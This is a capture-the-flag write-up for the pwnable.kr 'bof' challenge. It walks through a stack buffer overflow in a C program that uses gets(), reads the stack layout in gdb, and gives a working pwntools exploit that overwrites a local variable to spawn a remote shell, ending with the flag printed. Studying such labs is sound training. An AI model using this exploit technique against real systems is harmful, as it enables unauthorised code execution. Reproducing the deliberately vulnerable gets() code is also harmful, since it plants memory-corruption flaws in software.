# bof

## Description

bof - 5 pt

> Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? <br><br>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c <br><br>
> Running at : nc pwnable.kr 9000

## Solution

### Background

#### Buffer Overflow

A buffer overflow occurs when a program attempts to write more data to a buffer than it can hold. This can cause the program to crash, or it can be used to overwrite data in the program's memory.


### Exploit

This time, we are given two files: `bof` - the binary file, and `bof.c` - the source code. Let's take a look at the source code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

The program calls ```gets``` to read input from the user. ```gets``` is a dangerous function because it does not check the length of the input, so it can cause a buffer overflow. The program also checks if the input is equal to `0xcafebabe`, and if it is, it executes the command `/bin/sh`. This means that we need to overwrite the value of `key` with `0xcafebabe` in order to get a shell.

Using ```gdb``` to debug the program, and giving `AAAA` as input, we can see the stack:

```
(gdb) x/100x $esp

0xffffd0f0:	0xffffd10c	0x00000020	0x00000000	0xffffd2e4
0xffffd100:	0x00000000	0x00000000	0x01000000	0x41414141
0xffffd110:	0xf7fc4500	0x00000000	0xf7d904be	0xf7f9e054
0xffffd120:	0xf7fbe4a0	0xf7fd6f10	0xf7d904be	0x75f7b900
0xffffd130:	0xffffd170	0xf7fbe66c	0xffffd158	0x5655569f
0xffffd140:	0xdeadbeef	0x00000000	0xf7f9e000	0xf7e9694b
```

The adress of `key` is `0xffffd140`, and the adress of `overflowme` is `0xffffd10c`. We can see that the distance between them is `52` bytes. This means that we need to write `52` bytes of junk data, followed by `0xcafebabe` in order to overwrite the value of `key`.

```python
from pwn import *

con = remote('pwnable.kr', 9000)

payload = b'\x61' * 52 + p32(0xcafebabe)

con.sendline(payload)

con.interactive()
```

Running the script, we get a shell:

```
$ python3 exploit.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
```